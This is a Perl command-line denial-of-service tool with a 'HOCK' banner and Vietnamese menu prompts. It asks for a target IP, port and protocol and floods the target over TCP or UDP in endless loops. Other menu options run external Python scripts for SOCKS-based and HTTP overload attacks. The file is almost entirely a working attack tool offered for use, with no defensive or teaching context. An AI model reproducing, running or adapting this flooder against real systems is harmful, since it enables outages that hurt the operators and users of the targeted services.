#=== Use Modules ===#
use IO::Socket;
use Scalar::Util qw(looks_like_number);
use IO::Handle;
#=== Clear Screen ===#
system("cls || clear");
#Script Banner================================================================
my $code =  q{ 



        ,--,     ,----..                       ,--. 
      ,--.'|    /   /   \     ,----..      ,--/  /| 
   ,--,  | :   /   .     :   /   /   \  ,---,': / ' 
,---.'|  : '  .   /   ;.  \ |   :     : :   : '/ /  
|   | : _' | .   ;   /  ` ; .   |  ;. / |   '   ,   
:   : |.'  | ;   |  ; \ ; | .   ; /--`  '   |  /    
|   ' '  ; : |   :  | ; | ' ;   | ;     |   ;  ;    
'   |  .'. | .   |  ' ' ' : |   : |     :   '   \   
|   | :  | ' '   ;  \; /  | .   | '___  |   |    '  
'   : |  : ;  \   \  ',  /  '   ; : .'| '   : |.  \ 
|   | '  ,/    ;   :    /   '   | '/  : |   | '_\.' 
;   : ;--'      \   \ .'    |   :    /  '   : |     
|   ,/           `---`       \   \ .'   ;   |,'     
'---'                         `---`     '---'       
                                                    
                                                                                                                                                                                                                             

    
  ,--, .---. ,'|"\  ,-.-. .-. ,--,     ,---.-.   .-.  .-. .-..---.   ,--, ,-. .-. 
.' .')/ .-. )| |\ \ |(|  \| .' .'      | .-.\ \_/ )/  | | | / .-. ).' .') | |/ /  
|  |(_| | |(_| | \ \(_|   | |  |  __   | |-' \   (_)  | `-' | | |(_|  |(_)| | /   
\  \  | | | || |  \ | | |\  \  \ ( _)  | |--. ) (     | .-. | | | |\  \   | | \   
 \  `-\ `-' //(|`-' | | | |)|\  `-) )  | |`-' | |     | | |)\ `-' / \  `-.| |) \  
  \____)---'(__)`--'`-/(  (_))\____/   /( `--/(_|     /(  (_))---'   \____|((_)-' 
      (_)            (__)   (__)      (__)  (__)     (__)   (_)           (_)     

    =-------=-=-=-=-=-=-=-=-=-------=
};

# Thay thế HeartStealer thành HOCK

print $code;
print("\n");



# Check Intenret Connection !
print("\r[~] Kiem tra ket noi Internet [...]");
STDOUT->flush();
sleep(2);
my $check = IO::Socket::INET->new('PeerAddr'=>'www.google.com', 
	'PeerPort'=>80, 
	'Timeout'=>2, 
	'proto'=>'tcp');
if(!(defined $check && $check)){
        print("\r[-] Checking Internet Connection [Fail!]");
	print("\n[!] Error: Please Check Your Internet Connection !!!\n");
	exit(1);
}
$check->close();
print("\r[+] Checking Internet Connection [Connected] \n");
STDOUT->flush();
# INPUT TARGET INFO ==============================================

print q{
    =========================================================
    |   1    |  Tan cong bang UDP & TCP                     |
    |   2    |  Tan cong bang SOCK5 & SOCK4                 |
    =========================================================
};
print("\n\n[~]Lua chon: "); # Set Target IP
$choose = <STDIN>;
chomp ($choose);
while ($choose eq ""){
 print "   [!] Choose: ";
 $choose = <STDIN>;
 chomp ($choose);
}

if ($choose == 1) {

    print("\n\n[~]IP: "); # Set Target IP
    $host = <STDIN>;
    chomp ($host);
    while ($host eq ""){
     print "   [!] IP: ";
     $host = <STDIN>;
     chomp ($host);
    }
    print "TRAGET ==> $host\n";
    print "\n===============================";
    print "\n[~] Port: "; # Set Port
    $port = <STDIN>;
    chomp ($port);
    while ($port eq "" || !looks_like_number($port) || !grep{$port eq $_}(0..65535)){ 
     print "   [!] PORT: ";       
     $port = <STDIN>;
     chomp ($port); 
    } 
    print "PORT ==> $port\n";
    print "\n===============================";
    print "\n[~] Enter Protockol (TCP or UDP) :"; # Set Protockol;
    $proto = <STDIN>;
    chomp ($proto);
    while ($proto eq "" || !grep{$proto eq $_} 'TCP','UDP','tcp','udp'){
     print "   [!] Enter Protockol (TCP or UDP) ?: ";
     $proto = <STDIN>;
     chomp ($proto);
    }
    print "Protocol ==> $proto";
    print "\n===============================\n";
    sleep(1);

    $sock = IO::Socket::INET->new(
            PeerAddr => $host,
            PeerPort => $port,
            Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
    system("clear || cls");
    print "\n[*] Attack Has Been Start On [$host:$port] proto => [$proto].......\n\n";
    sleep(1);
    if(grep{$proto eq $_} 'TCP','tcp'){
        while (1) {
           $sock = IO::Socket::INET->new(
            PeerAddr => $host,
            PeerPort => $port,
            Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
            for($i=0; $i<=500; $i++){
                $size = rand() * 8921873 * 99919988;
                send($sock, $size, $size);
                send($sock, $size*2, $size*2); 
                send($sock, $size*3, $size*3);
                send($sock, $size*4, $size*4);
                send($sock, $size*9999999999999,$size*9999999999999);
                send($sock, $size*999999999999999,$size*999999999999999);
                send($sock, $size*9999999999999,$size*9999999999999);
                send($sock, $size*4, $size*4);
                send($sock, $size*3, $size*3);
                send($sock, $size*2, $size*2);
                send($sock, $size, $size);
                send($sock, $size*9999999999999,$size*9999999999999);
                send($sock, $size*999999999999999,$size*999999999999999);
                send($sock, $size*9999999999999,$size*9999999999999);

                print ("Attack: (=>$host:$port~$proto<=)\n");
            }
        }

    }else {
       $sock = IO::Socket::INET->new(
            PeerAddr => $host,
            PeerPort => $port,
            Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
       while (1) {
                $size = rand() * 8921873 * 99919988;
                send($sock, $size, $size);
                send($sock, $size*2, $size*2);
                send($sock, $size*3, $size*3);
                send($sock, $size*4, $size*4);
                send($sock, $size*9999999999999,$size*9999999999999);
                send($sock, $size*999999999999999,$size*999999999999999);
                send($sock, $size*9999999999999,$size*9999999999999);
                send($sock, $size*4, $size*4);
                send($sock, $size*3, $size*3);
                send($sock, $size*2, $size*2);
                send($sock, $size, $size);
                send($sock, $size*9999999999999,$size*9999999999999);
                send($sock, $size*999999999999999,$size*999999999999999);
                send($sock, $size*9999999999999,$size*9999999999999);

                print ("Attack: (=>$host:$port~$proto<=)\n");

       }
    }
    $sock->close()
# }elsif ($choose == 2){
#     print("\n\n[~]Target Website (HTTP): "); # Set Target Web
#     $web = <STDIN>;
#     chomp ($web);
#     while ($web eq ""){
#      print "   [!] IP: ";
#      $web = <STDIN>;
#      chomp ($web);
#     }  
#     print "Target ==> $web\n";
#     print "\n===============================";
#     print "\n[~] Time (500): "; # Set Time
#     $time = <STDIN>;
#     chomp ($time);
#     while ($time eq ""){ 
#      print "   [!] PORT: ";       
#      $time = <STDIN>;
#      chomp ($time); 
#     }
#     print "Time ==> $time\n";
#     print "\n===============================";
#     sleep(1);

#     system("python ./lib/overload/overload.py --target $web --method HTTP --time $time --thread 200") == 0 or die "Python script returned error $?";
}elsif ($choose == 2){
    system("python ./lib/cc/cc.py") == 0 or die "Python script returned error $?";
}
